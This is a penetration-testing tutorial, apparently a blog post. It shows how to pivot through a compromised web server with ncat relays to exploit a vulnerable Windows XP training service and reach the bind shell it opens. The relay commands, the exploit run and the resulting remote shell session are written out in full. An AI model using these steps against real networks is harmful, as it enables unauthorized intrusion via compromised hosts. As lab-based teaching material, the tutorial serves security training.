
In the past two articles, we pivoted our exploit to our target with the help of SSH. If SSH is not available, we can try to use client-to-client and listener-to-listener relays with netcat, as described by Ed Skoudis in [Secrets of America's Top Pen Testers](http://www.inguardians.com/research/docs/Skoudis_pentestsecrets.pdf). We will modify Skoudis' technique by using ncat instead of netcat. Ncat is meant to be a replacement for netcat, and is included in the Nmap 5.x and higher package. I prefer ncat over netcat for this as it allows us to use the same syntax to set up the relays regardless of whether the pivot is running Linux, Windows, or Mac OS X.

<!--more-->

### The scenario

There are two networks, 192.168.81.0/24 and 192.168.63.0/24. Our attacking machine, and a web server that has access to the 192.168.63.0/24 network are located in the 192.168.81.0/24 network. Our target, a Windows XP SP2 machine, is located in the 192.168.63.0/24. Our attacking machine does not have direct access to it, but the web server does.

![](/images/2012-10-16/01.jpg)

We've already compromised the web server and obtained SSH access to it as the user webmaster. Our goal is to use the web server as our pivot and obtain a remote shell on the Windows XP machine.

### The exploit

The Windows XP machine runs a vulnerable service called Server-Strcpy on port 10000. Server-Strcpy is part of the [SecurityTube Exploit Research Megaprimer](http://www.securitytube.net/video/1399) series, and can be downloaded at [http://code.securitytube.net/Server-Strcpy.exe](http://code.securitytube.net/Server-Strcpy.exe). I've written a quick exploit for Server-Strcpy.exe that binds a shell on port 4444, and can be downloaded [here](http://techorganic.com/software/serverstrcpy.py).

### The attack

We need to run ncat on our attacking machine, and on the web server. This means that we need to transfer ncat over to the web server. If your pivot is a Linux machine, you can build a static ncat binary using the following: 

```
# LDFLAGS="-static" ./configure && make ncat_build
```

If the pivot is a Windows machine, you can download a static build of ncat.exe from [http://seclists.org/nmap-dev/2011/q2/1090](http://seclists.org/nmap-dev/2011/q2/1090). Once ncat has been copied over to the pivot, we can begin.

On our attacking machine, we setup a listener-to-listener relay using the following command: 

```
# ncat -lv --broker -m2 10000
Ncat: Version 6.01 ( http://nmap.org/ncat )
Ncat: Listening on :::10000
Ncat: Listening on 0.0.0.0:10000
```

At this point, we'll have port 10000 listening on our machine. On the web server we execute the following command: 

```
$ ncat -v 192.168.81.125 10000 -c "ncat -v 192.168.63.142 10000"
Ncat: Version 5.51 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.81.125:10000.
Ncat: Version 5.51 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.63.142:10000.
```

This tells ncat to connect to our ncat instance listening on port 10000, and then to connect to port 10000 on the target. This completes the setup, and data from our machine will flow through the web server and to the target.

Note that the syntax for executing the client-to-client relay on the pivot is the same, regardless of whether it's a Linux, Windows, or OS X machine. There's nothing else that needs to be done, such as creating a pipe. Compare it to the technique that uses traditional netcat to see the difference.

We can now execute our exploit. Keep in mind that we need to send it to port 10000 on our machine: 

```
# ./exploit.py 127.0.0.1 10000
[+] sending payload of length 1479
[+] done
#
```

With the exploit sent, we can now terminate the ncat relays. Assuming the exploit worked, a bind shell should be listening on 4444 on the target. In order to access it, we once again setup ncat relays, only this time we'll specify port 4444. On our machine we run the following command: 

```
# ncat -lv --broker -m2 4444
Ncat: Version 6.01 ( http://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
```

On the web server, we setup the client-to-client relay: 

```
$ ncat -v 192.168.81.125 4444 -c "ncat -v 192.168.63.142 4444"
Ncat: Version 5.51 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.81.125:4444.
Ncat: Version 5.51 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.63.142:4444.
```

Using netcat (or ncat), we can connect to port 4444 on our machine to get a remote shell on the target: 

```
# nc -v 127.0.0.1 4444
localhost [127.0.0.1] 4444 (?) open
 
 
C:\Documents and Settings\Administrator\Desktop>ipconfig
ipconfig
 
Windows IP Configuration
 
 
Ethernet adapter Local Area Connection:
 
        Connection-specific DNS Suffix  . : localdomain
        IP Address. . . . . . . . . . . . : 192.168.63.142
        Subnet Mask . . . . . . . . . . . : 255.255.255.0
        Default Gateway . . . . . . . . . : 192.168.63.2
 
C:\Documents and Settings\Administrator\Desktop>
```

We've obtained remote shell access to the Windows XP target once more.

Ncat is a great tool and builds enhancements into the old netcat. It's small, available for major operating systems, and easy to use. In part 4 of this serieis, we'll look at Metasploit's pivoting feature. If Metasploit is your exploitation framework of choice, you'll want to learn to use it to pivot your attacks.
